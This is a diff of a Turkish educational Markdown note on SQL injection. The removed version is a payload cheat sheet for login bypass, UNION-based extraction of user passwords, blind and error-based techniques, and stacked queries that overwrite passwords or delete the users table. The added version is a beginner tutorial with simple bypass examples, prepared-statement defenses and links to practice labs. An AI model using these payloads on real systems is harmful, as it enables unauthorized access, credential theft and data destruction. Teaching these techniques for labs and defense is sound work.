@@ -1,151 +1,144 @@
-**SQL Injection**, kullanıcı girdisinin **kontrolsüzce SQL sorgularına** eklenmesiyle ortaya çıkar. 🚨  
-Saldırganlar bu sayede **veri çalabilir, değiştirebilir veya sistem manipüle edebilir**. 💻🕵️
+## 🔹 1. Giriş: SQL Nedir?
 
----
-
-## 🔹 1️⃣ Temel Kullanım – Login Bypass
-
-```sql
-' OR '1'='1                 -- Basit bypass, her zaman doğru
-' OR username='admin' --     -- Admin login atlatma
-' UNION SELECT username, password FROM users; --   -- Tüm kullanıcıları listeleme
-```
-
-💡 **İpucu:** Basit OR koşulları ve UNION sorguları, başlangıç için en çok kullanılan yöntemlerdir.
-
----
-
-## 🔹 2️⃣ Veri Tabanı ve Tablo Keşfi
-
-```sql
-' UNION SELECT table_name, null FROM information_schema.tables; -- Tabloları öğren
-' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'; -- Kolonlar
-```
-
-📂 **Hedef:** Önce hangi tablolar ve kolonlar var, öğrenmek.
-
----
-
-## 🔹 3️⃣ Veri Çekme (Exfiltration)
-
-```sql
-' UNION SELECT username, (SELECT password FROM users WHERE username='admin') FROM dual; -- Admin şifresi
-' UNION SELECT username, password FROM users WHERE username=0x61646D696E; -- Hex ile 'admin'
-```
-
-💥 **Hack & CTF:** Özel veri sızdırmak için alt sorgular ve hex kodları kullanılır.
-
----
-
-## 🔹 4️⃣ Veri Değiştirme / Silme
-
-```sql
-' ; UPDATE users SET password='hacked' WHERE username='alice'; -- Şifre değiştirme
-' ; DELETE FROM users; -- Tüm verileri sil
-```
-
-⚠️ **Dikkat:** Gerçek sistemlerde riskli! Test ortamında çalıştırın.
-
----
-
-## 🔹 5️⃣ Blind SQL Injection
-
-```sql
-' AND SUBSTRING(password,1,1)='a' -- Boolean tabanlı
-' OR IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) -- Zaman tabanlı
-```
-
-⏳ **Zor durum:** Veri görünmüyorsa boolean ve zaman tabanlı teknikler kullanılır.
-
----
-
-## 🔹 6️⃣ Error-Based SQL Injection
-
-```sql
-' AND 1=CONVERT(int,(SELECT @@version)) -- Hatalardan veritabanı sürümü öğren
-```
-
-🛠️ **Hedef:** Veritabanı bilgilerini hata mesajlarından çıkarmak.
-
----
-
-## 🔹 7️⃣ Second-Order SQL Injection
-
-```sql
--- Kullanıcı girdisi önce kaydedilir
-test' OR '1'='1
--- Sonra başka sorguda tetiklenir
-```
-
-🔄 **Karmaşık senaryo:** Girdi ilk aşamada zararsız görünür, sonra tetiklenir.
-
----
-
-## 🔹 8️⃣ Parametrized Queries / Korunma
-
-```python
-# Python
-cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s", (user, passwd))
-```
-
-```php
-# PHP PDO
-$stmt = $pdo->prepare('SELECT * FROM users WHERE username=? AND password=?');
-$stmt->execute([$user, $passwd]);
-```
-
-✅ **Öneri:** Parametrized queries ve prepared statements her zaman güvenli.
-
----
-
-## 🔹 9️⃣ CTF / Pentest Workflow – Strateji
-
-1. **Login bypass denemeleri**
-	```sql
-    ' OR '1'='1                                                                    ' 
-	' OR username='admin' --
-    ```   
+- **SQL (Structured Query Language)**, veritabanlarıyla iletişim kurmak için kullanılan bir dildir.
     
-2. **Tablo ve kolon keşfi**
+- Veritabanında veri **ekleme**, **okuma**, **güncelleme** ve **silme** işlemleri SQL ile yapılır.
     
-    ```sql
-    ' UNION SELECT table_name, null FROM information_schema.tables; --
-    ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'; --
+
+📌 Örnek SQL sorgusu:
+
+```sql
+SELECT * FROM kullanicilar WHERE kullanici_adi = 'ahmet';
+```
+
+---
+
+## 🔹 2. Web Formları ve Veritabanı
+
+Birçok web sitesinde kullanıcı adı/şifre giriş formu bulunur.
+
+📌 Örneğin:
+
+```html
+<form method="POST" action="giris.php">
+  Kullanıcı Adı: <input name="kullanici_adi">
+  Şifre: <input type="password" name="sifre">
+  <input type="submit" value="Giriş">
+</form>
+```
+
+Bu form verileri sunucuya gönderir ve sunucu şu şekilde bir SQL sorgusu oluşturabilir:
+
+```sql
+SELECT * FROM kullanicilar 
+WHERE kullanici_adi = 'kullanici_formdan' AND sifre = 'sifre_formdan';
+```
+
+Eğer böyleyse... Tehlike başlıyor!
+
+---
+
+## 🔹 3. SQL Injection Nedir?
+
+Kötü niyetli bir kullanıcı, form alanlarına özel kodlar yazarak SQL sorgusunu manipüle edebilir.
+
+📌 Örnek saldırı:
+
+Kullanıcı Adı kısmına şu yazılır:
+
+```sql
+' OR '1'='1
+```
+
+Sunucuda oluşan SQL sorgusu şu hale gelir:
+
+```sql
+SELECT * FROM kullanicilar 
+WHERE kullanici_adi = '' OR '1'='1' AND sifre = '';
+```
+
+🧨 Bu sorgu her zaman doğru döner, çünkü `'1'='1'` her zaman doğrudur. Bu da saldırganın **giriş yapmasını sağlar**!
+
+---
+
+## 🔹 4. SQL Injection Örnekleri
+
+### 📌 Örnek 1: Basit Giriş Atlatma
+
+```sql
+' OR 1=1 --
+```
+
+- `--` işareti, SQL'de yorum satırıdır. Sonraki kısmı yok sayar.
+    
+- Bu ifade, şifre kontrolünü atlar.
+    
+
+---
+
+### 📌 Örnek 2: Veritabanı Bilgilerini Görme
+
+```sql
+' UNION SELECT null, version(), null --
+```
+
+- Eğer web sayfası kullanıcı bilgilerini ekrana yazıyorsa, bu sorgu veritabanının versiyonunu gösterebilir.
+    
+
+---
+
+## 🔹 5. SQL Injection Nasıl Önlenir?
+
+1. ✅ **Hazır sorgular (Prepared Statements)** kullan:
+    
+    ```php
+    $stmt = $db->prepare("SELECT * FROM kullanicilar WHERE kullanici_adi = ? AND sifre = ?");
+    $stmt->execute([$kullanici_adi, $sifre]);
     ```
     
-3. **Veri sızdırma**
+2. ✅ **Girişleri doğrula** (örneğin sadece harf/rakam içermeli).
     
-    ```sql
-    ' UNION SELECT username, password FROM users; --
-    ' UNION SELECT username, (SELECT password FROM users WHERE username='admin') FROM dual; --
-    ```
+3. ✅ **ORM** sistemleri kullan (Laravel, Django gibi).
     
-4. **Blind injection (zor durumda)**
-    
-    ```sql
-    ' AND SUBSTRING(password,1,1)='a' --
-    ' OR IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
-    ```
-    
-5. **Veri değiştirme / silme (kritik testlerde dikkat!)**
-    
-    ```sql
-    ' ; UPDATE users SET password='hacked' WHERE username='alice'; --
-    ' ; DELETE FROM users; --
-    ```
+4. ❌ Asla kullanıcı girdisini doğrudan SQL içine yerleştirme!
     
 
 ---
 
-## 🔹 1️⃣0️⃣ Özet
+## 🔹 6. Pratik Alıştırmalar (Eğitim Amaçlı)
 
-- **SQL Injection =** Kullanıcı girdisinin kontrolsüzce SQL sorgusuna eklenmesi
+⚠️ Bu alıştırmaları sadece **güvenli, izole edilmiş test ortamlarında** yapın!
+
+- [DVWA - Damn Vulnerable Web Application](https://dvwa.co.uk/)
     
-- **Riskler =** Veri sızdırma, değiştirme, yetki ele geçirme
+- [bWAPP - Buggy Web Application](http://www.itsecgames.com/)
     
-- **Korunma =** Parametrized queries ✅, input validation ✅, minimum yetki 🔒
+- [HackTheBox](https://www.hackthebox.com/)
     
-- **CTF odaklı =** Login bypass, tablo keşfi, veri sızdırma ve blind teknikler 🌟
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
     
 
 ---
+
+## 🔹 7. Gerçek Hayatta Sonuçları
+
+- 🔐 Kişisel verilerin çalınması
+    
+- 💰 Banka sistemlerinin ele geçirilmesi
+    
+- 📉 Şirket itibarının zedelenmesi
+    
+- ⚖️ Yasal sorumluluklar
+    
+
+---
+
+## 🎓 Özet
+
+|Konu|Açıklama|
+|---|---|
+|SQL Nedir?|Veritabanı sorgulama dilidir.|
+|SQL Injection Nedir?|Sorguların kötü niyetle değiştirilmesi.|
+|Nasıl Çalışır?|Girdi yoluyla sorgulara kod enjekte edilir.|
+|Tehlikeleri|Yetkisiz erişim, veri sızıntısı vs.|
+|Korunma Yolları|Hazır sorgular, filtreleme, ORM, doğrulama.|
